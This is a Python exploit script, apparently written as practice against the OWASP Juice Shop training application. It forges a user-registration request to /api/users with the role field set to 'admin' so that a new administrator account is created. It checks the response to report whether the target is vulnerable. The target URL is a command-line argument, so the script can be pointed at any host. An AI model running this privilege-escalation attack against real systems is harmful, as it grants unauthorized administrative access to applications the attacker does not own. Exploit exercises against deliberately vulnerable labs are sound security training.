# Create a new Juice Shop account with role improperly
# elevated to admin via html form fabrication

import requests
import datetime
import json
from random import randint, SystemRandom as SR
from string import ascii_letters as letters


local_url = "http://localhost:3000"


class InvulnerabilityError(Exception):
    pass


class HTTPError(Exception):
    pass


class AdminAccount:
    """
    Create a new admin account using a forged HTML form.
    Use new() rather than __init__().
    """
    def __init__(self, host="http://localhost:3000"):
        self.host = host
        self.form_endpoint = host + "/api/users"    # Found via Wireshark
        self.email = "test{0}@test.com".format(randint(0, 1000))
        self.password = ''.join(SR().choice(letters) for _ in range(12))
        self.security_question = {
            "id": 1,
            "question": "Your eldest sibling name?",
            "answer": "answer"
        }

    @classmethod
    def new(cls, host="http://localhost:3000"):
        """Return preconfigured AdminAccount object"""
        account = cls(host)
        account.create_admin_account()
        return account

    def generate_form_data(self) -> dict:
        """Returns fabricated admin account data with random password"""
        return {
            "email": self.email,
            "password": self.password,
            "passwordRepeat": self.password,
            "securityQuestion": {
                "id": self.security_question["id"],
                "question": self.security_question["question"],
                "createdAt": datetime.datetime.now(),
                "updatedAt": datetime.datetime.now(),
            },
            "securityAnswer": self.security_question["question"],
            "role": "admin"     # This can be modified client-side. Oops...
        }

    def send_form(self):
        form_data = self.generate_form_data()
        return requests.post(self.form_endpoint, data=form_data)

    def create_admin_account(self):
        """
        Create new admin account used forged HTML form.

        :returns:   success status: bool
        """
        response = self.send_form()
        if response.status_code == 201:
            sent_form = json.loads(response.text)
            if sent_form['data']['role'] == 'admin':
                return True
            else:
                raise InvulnerabilityError("App invulernable to this attack")
        raise HTTPError(f"HTTP status: {response.status_code}")


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(
        prog="AdminForge",
        description="Forge admin account for Juice Shop",
    )
    parser.add_argument('url', type=str, nargs='?', default=local_url)
    args = parser.parse_args()

    if args.url:
        account = AdminAccount(args.url)
    else:
        account = AdminAccount()

    print("Generating admin account with...")
    print("User email:", account.email)
    print("User password:", account.password)
    print("Security question:", account.security_question['question'])
    print("Question answer:", account.security_question['answer'], "\n")

    try:
        account.create_admin_account()
        print("Success!")
    except HTTPError as e:
        print("Account not generated -- ", e)
    except InvulnerabilityError as e:
        print(e)
